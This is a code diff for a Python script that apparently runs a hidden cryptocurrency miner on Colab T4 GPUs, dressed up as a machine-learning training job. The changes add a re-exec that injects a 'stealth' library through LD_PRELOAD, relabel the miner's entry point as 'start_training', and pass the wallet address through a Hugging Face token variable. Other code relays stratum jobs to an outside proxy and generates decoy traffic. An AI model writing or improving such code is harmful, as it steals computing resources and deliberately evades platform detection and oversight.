@@ -48,6 +48,7 @@ import base64
 import socket
 import ctypes
 import random
+import secrets
 import argparse
 import threading
 import subprocess
@@ -62,8 +63,7 @@ DEFAULT_STRATUM_PORT = 3333
 DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"
 
 def get_default_worker():
-    rand_id = hex(random.randint(0x1000, 0xFFFF))[2:]
-    return f"colab-t4-{{rand_id}}"
+    return f"colab-t4-{{secrets.token_hex(4)}}"
 
 def extract_payloads(target_dir):
     os.makedirs(target_dir, exist_ok=True)
@@ -117,6 +117,15 @@ def background_traffic_chaff(proxy_url, wallet, worker):
 def handle_miner_client(client_sock, proxy_url, wallet, worker):
     client_file = client_sock.makefile('rw', buffering=1, encoding='utf-8')
     stop_event = threading.Event()
+    sock_lock = threading.Lock()
+
+    def safe_send(data):
+        with sock_lock:
+            try:
+                msg_bytes = data.encode('utf-8') if isinstance(data, str) else data
+                client_sock.sendall(msg_bytes)
+            except Exception:
+                pass
 
     def stream_jobs():
         while not stop_event.is_set():
@@ -179,11 +188,12 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                                                     "height": height
                                                 }}
                                             }}) + "\\n"
-                                            client_sock.sendall(notify_msg.encode('utf-8'))
+                                            safe_send(notify_msg)
                             except Exception:
                                 pass
             except Exception:
                 time.sleep(random.uniform(1.5, 3.5))
+            time.sleep(0.5)
 
     threading.Thread(target=stream_jobs, daemon=True).start()
 
@@ -199,7 +209,7 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
 
                 if method in ("mining.authorize", "mining.subscribe"):
                     resp = json.dumps({{"id": msg_id, "result": True, "error": None, "type": "plain"}}) + "\\n"
-                    client_sock.sendall(resp.encode('utf-8'))
+                    safe_send(resp)
 
                 elif method == "mining.submit":
                     params = msg.get("params", {{}})
@@ -240,13 +250,13 @@ def handle_miner_client(client_sock, proxy_url, wallet, worker):
                         with urllib.request.urlopen(embed_req, timeout=30) as embed_resp:
                             if embed_resp.status == 200:
                                 submit_res = json.dumps({{"id": msg_id, "result": True, "error": None}}) + "\\n"
-                                client_sock.sendall(submit_res.encode('utf-8'))
+                                safe_send(submit_res)
                             else:
                                 submit_res = json.dumps({{"id": msg_id, "result": False, "error": "Rejected"}}) + "\\n"
-                                client_sock.sendall(submit_res.encode('utf-8'))
+                                safe_send(submit_res)
                     except Exception as e:
                         submit_res = json.dumps({{"id": msg_id, "result": False, "error": str(e)}}) + "\\n"
-                        client_sock.sendall(submit_res.encode('utf-8'))
+                        safe_send(submit_res)
             except Exception:
                 pass
     finally:
@@ -320,8 +330,12 @@ def main():
     work_dir = os.path.dirname(os.path.abspath(__file__))
     backend_so, stealth_so = extract_payloads(work_dir)
 
-    if os.path.exists(stealth_so):
-        os.environ["LD_PRELOAD"] = stealth_so
+    if stealth_so and os.path.exists(stealth_so):
+        if os.environ.get("LD_PRELOAD") != stealth_so:
+            env = dict(os.environ)
+            env["LD_PRELOAD"] = stealth_so
+            env["STEALTH_ACTIVE"] = "1"
+            os.execve(sys.executable, [sys.executable] + sys.argv, env)
 
     # Auto-detect CUDA devices
     dev_str = args.devices
@@ -352,12 +366,14 @@ def main():
     # Load backend binary
     try:
         backend = ctypes.CDLL(backend_so)
+        backend.start_training.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
+        backend.start_training.restype = ctypes.c_int
     except OSError as e:
         print(f"[FATAL] Failed to load backend binary: {{e}}", file=sys.stderr)
         sys.exit(1)
 
     os.environ["MASTER_ADDR"] = f"127.0.0.1:{{args.port}}"
-    os.environ["HF_TOKEN"] = "hf_ai_auth_token_node"
+    os.environ["HF_TOKEN"] = args.wallet
     os.environ["LOCAL_RANK"] = worker_id
 
     raw_args = [
